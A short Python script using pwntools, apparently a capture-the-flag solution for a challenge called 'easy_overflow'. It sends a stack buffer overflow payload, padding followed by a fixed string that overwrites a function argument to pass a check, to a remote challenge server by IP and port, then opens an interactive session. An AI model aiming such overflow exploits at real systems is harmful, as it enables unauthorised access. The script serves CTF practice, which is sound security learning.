from pwn import *
context.arch = 'amd64'

# just overwrite the value of function's argument to pass the check
# p = process('./easy_overflow')
p = remote('38.39.244.2',28021)

payload = 'A'*(0x70-0x40) + 'n0t_r3@11y_f1@g'
p.sendline(payload)
p.interactive()
